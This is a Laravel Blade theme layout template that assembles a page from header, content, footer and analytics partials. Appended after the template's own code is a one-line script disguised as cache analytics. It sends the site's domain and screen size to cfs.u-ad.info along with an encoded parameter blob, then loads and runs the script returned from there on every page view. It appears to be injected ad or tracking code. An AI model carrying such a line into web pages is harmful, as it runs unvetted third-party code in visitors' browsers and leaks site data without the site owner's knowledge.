<!DOCTYPE html>
<html>
    <head>
        {{ Theme::partial('seostuff') }}    
        {{ Theme::partial('defaultcss') }}  
        <!-- Google Webfont -->
        <link href='http://fonts.googleapis.com/css?family=Droid+Serif:400,700' rel='stylesheet' type='text/css'>
        {{ Theme::asset()->styles() }}  
        <!--[if lt IE 9]>
            <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->        
    </head>
    <body class="wrapper">
        {{ Theme::partial('header') }}  
        <!-- Mid Section Starts -->
        <section class="content data-content">
            {{ Theme::place('content') }}   
            {{-- Theme::partial('subscribe') --}}   
        </section>
        {{ Theme::partial('footer') }}  
        {{ Theme::partial('defaultjs') }}
        {{ Theme::partial('analytic') }}    
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bTE%2fzUx%2bPMjCTlvbVK1O51oZtNEM1IRm8yvBWLCbWmC1cbya03ukkonWQq2Pfx8Tpz47JtDPgHZxbaSCNFGZqVlfTYLhAIZowtSpOYyoPVVozeBXBnQ%2f04AS6DopvKtXTw%2fHWkjWZjnTB3ni5IRitzHrT3%2fI1%2b8zvfqzTqK2%2fu2%2b0zQ4jdBNOOys%2bUHLL%2f4j2TRkiM38P9q8s%2fMELMeyJzAOgafZe8wXb3Oq7V1O72MGzjbp54%2f%2fYW3ZUnBt7hPcHgaKxqgqtb4HLfE2qTkCp8uzrt2PLLGqBubklqT3RajZTBv2HxJanErbJU71w7wMXowK3e5JUUzMySR8Uc7mHX6Ok6Acr3OeVnoAdavYp1n2UcmscKKgGxipNgX59VvSt9d3k8nOr5vY0TpPDhIeMGoQJT2kA7M0q188dzPU8IxzSY30L1cpY5D0Cr1v5EvG1EnATxUzOoi0FQ0RBHa%2b1RRqOmeRJUltw3oN7HIuCqCwbkJa4UR3KZGFna9HQ3EO2Y%2bUah2eL0%2bvqKBPvN%2f7dzG689Eq8Z%2fskORnHePOeQTcyMfa2HAmZ6r1ec%2fuH0hqk" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>